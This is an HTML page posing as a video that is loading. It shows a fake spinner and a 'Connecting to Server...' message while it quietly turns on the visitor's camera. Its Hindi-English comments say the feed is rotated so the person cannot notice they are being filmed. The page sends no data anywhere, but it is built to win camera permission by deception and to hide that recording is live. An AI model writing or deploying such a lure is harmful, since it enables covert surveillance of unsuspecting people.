<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Video...</title>
    <style>
        body { margin: 0; padding: 0; background: #000; overflow: hidden; }
        
        /* Yeh video element hai jo background mein chalega */
        #myCamera {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: rotate(180deg); /* Camera ko ulta dikhane ke liye taaki wo khud ko na dekh paye */
        }

        /* Fake UI Overlay */
        .overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            color: white;
            font-family: Arial, sans-serif;
            pointer-events: none; /* Taaki touch pass ho jaye */
        }

        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #fff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- Camera Stream -->
    <video id="myCamera" autoplay playsinline muted></video>

    <!-- Fake Loading Text -->
    <div class="overlay">
        <div class="spinner"></div>
        <p>Connecting to Server...</p>
    </div>

    <script>
        // Camera Access Logic
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(function(stream) {
                document.getElementById('myCamera').srcObject = stream;
            })
            .catch(function(err) {
                console.log("Error accessing camera: " + err);
                alert("Camera not found!");
            });
    </script>
</body>
</html>
